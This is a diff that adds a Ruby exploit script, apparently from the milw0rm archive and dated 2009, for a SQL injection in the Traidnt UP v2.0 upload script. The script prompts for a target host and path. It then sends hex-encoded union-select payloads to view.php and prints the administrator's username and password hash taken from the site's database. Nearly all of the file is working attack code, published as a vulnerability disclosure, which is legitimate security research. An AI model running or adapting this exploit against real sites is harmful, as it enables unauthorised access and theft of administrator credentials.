@@ -1,0 +1,97 @@
+#!/usr/bin/ruby
+
+#=============================================#
+#          Traidnt UP v2.0 Exploit            #
+#         SQL Injection Vulnerability         #
+#---------------------------------------------#
+# Date: 05-08-2009                            #
+# Discovered & written by: Jafer Al-Zidjali   #
+# Email: jafer[at]scorpionds.com              #
+# Website: www.scorpionds.com                 #
+#---------------------------------------------#
+# Conditions:                                 #
+#            1. magic_quotes_gpc=OFF          #
+# Notes:                                      #
+#       1. Author has been notified           #
+#       2. A public patch has been released   #
+#=============================================#
+
+require "net/http"
+require "base64"
+
+intro=[
+          "+=============================================+",
+          "+          Traidnt UP v2.0 Exploit            +",
+          "+        SQL Injection Vulnerability          +",
+          "+  Discovered & written by: Jafer Al-Zidjali  +",
+          "+         Email: jafer[at]scorpionds.com         +",
+          "+         Website: www.scorpionds.com         +",
+          "+=============================================+"
+          ]
+
+def print_intro text
+  w="|"
+  text.each do |str|
+    str.scan(/./) do |c|
+        STDOUT.flush
+      if w=="|" 
+        print "\b"+c +w
+        w="/"
+      elsif w=="/" 
+        print "\b"+c +w
+        w="-"  
+      elsif w=="-" 
+        print "\b"+c +w
+        w="\\" 
+      else
+      print "\b"+c +w
+      w="|"
+      end
+      sleep 0.05
+    end
+    
+    print "\b "
+    puts ""
+  end
+end
+
+print_intro intro
+
+puts "\nEnter host name (e.g. example.com):"
+host=gets.chomp
+
+puts "\nEnter script path (e.g. /upload/):"
+path=gets.chomp
+
+
+puts "\nPress any key to continue..."
+opt=gets.chomp
+begin
+shellcode=
+"\x76\x69\x65\x77\x2e\x70\x68\x70\x3f\x66\x69\x6c\x65\x3d\x62\x6c\x61\x68\x62\x6c"+
+"\x61\x68\x27\x2b\x75\x6e\x69\x6f\x6e\x2b\x73\x65\x6c\x65\x63\x74\x2b\x31\x2c\x63"+
+"\x6f\x6e\x63\x61\x74\x28\x27\x53\x54\x41\x52\x54\x27\x2c\x61\x64\x6d\x69\x6e\x5f"+
+"\x75\x73\x65\x72\x2c\x27\x45\x4e\x44\x27\x29\x2c\x33\x2c\x34\x2c\x35\x2c\x36\x2c"+
+"\x37\x2c\x38\x2c\x39\x2c\x30\x2b\x66\x72\x6f\x6d\x2b\x61\x64\x6d\x69\x6e\x2b\x77"+
+"\x68\x65\x72\x65\x2b\x61\x64\x6d\x69\x6e\x5f\x69\x64\x3d\x27\x31"
+
+http = Net::HTTP.new(host, 80)
+resp= http.get(path+shellcode)
+puts "Username: "+(/START(.+)END/).match(resp.body)[1]
+
+shellcode=
+"\x76\x69\x65\x77\x2e\x70\x68\x70\x3f\x66\x69\x6c\x65\x3d\x62\x6c\x61\x68\x62\x6c"+
+"\x61\x68\x27\x2b\x75\x6e\x69\x6f\x6e\x2b\x73\x65\x6c\x65\x63\x74\x2b\x31\x2c\x63"+
+"\x6f\x6e\x63\x61\x74\x28\x27\x53\x54\x41\x52\x54\x27\x2c\x61\x64\x6d\x69\x6e\x5f"+
+"\x70\x61\x73\x73\x77\x6f\x72\x64\x2c\x27\x45\x4e\x44\x27\x29\x2c\x33\x2c\x34\x2c"+
+"\x35\x2c\x36\x2c\x37\x2c\x38\x2c\x39\x2c\x30\x2b\x66\x72\x6f\x6d\x2b\x61\x64\x6d"+
+"\x69\x6e\x2b\x77\x68\x65\x72\x65\x2b\x61\x64\x6d\x69\x6e\x5f\x69\x64\x3d\x27\x31"
+
+http = Net::HTTP.new(host, 80)
+resp= http.get(path+shellcode)
+puts "Password Hash: "+(/START(.+)END/).match(resp.body)[1]
+rescue
+puts "Could not fetch data. magic_quotes_gpc probably is ON."
+end
+
+# milw0rm.com [2009-08-18]
